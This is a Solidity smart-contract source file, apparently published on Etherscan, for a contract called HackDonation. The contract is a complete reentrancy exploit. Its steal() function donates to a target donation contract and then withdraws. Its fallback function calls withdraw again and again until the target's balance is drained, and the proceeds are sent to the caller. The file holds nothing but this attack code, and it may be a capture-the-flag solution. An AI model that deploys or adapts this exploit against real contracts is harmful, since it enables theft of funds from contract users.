/**
 *Submitted for verification at Etherscan.io on 2021-05-08
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.6.12;



// File: HackDonation.sol

contract HackDonation {
  address public donationContractAddress;
  uint256 amountStealPerCall;
  uint256 cnt_loop = 1;

  // DONATE_SELECTOR = bytes4(keccak256(byte("donate(address))))
  bytes4 constant DONATE_SELECTOR = 0x00362a95;
  // WITHDRAW_SELECTOR = bytes4(keccak256(byte("withdraw(uint))))
  bytes4 constant WITHDRAW_SELECTOR = 0x2e1a7d4d;

  constructor(address _donationContractAddress) public {
    donationContractAddress = _donationContractAddress;
  }

  function steal() public payable {
    amountStealPerCall = msg.value;
    (bool result, ) =
      donationContractAddress.call{ value: msg.value }(
        abi.encodeWithSelector(DONATE_SELECTOR, address(this))
      );

    require(result, "call donate not success");
    (result, ) = donationContractAddress.call(
      abi.encodeWithSelector(WITHDRAW_SELECTOR, msg.value)
    );
    require(result, "call withdraw not success");

    payable(msg.sender).transfer(address(this).balance);
  }

  fallback() external payable {
    cnt_loop += 1;
    uint256 amount =
      donationContractAddress.balance < amountStealPerCall
        ? donationContractAddress.balance
        : amountStealPerCall;
    if (amount == 0) {
      return;
    }
    // require(amount < 5, "less than amountStealPerCall");

    (bool result, ) =
      donationContractAddress.call(
        abi.encodeWithSelector(WITHDRAW_SELECTOR, amount)
      );
    require(result, "call withdraw not success");
  }
}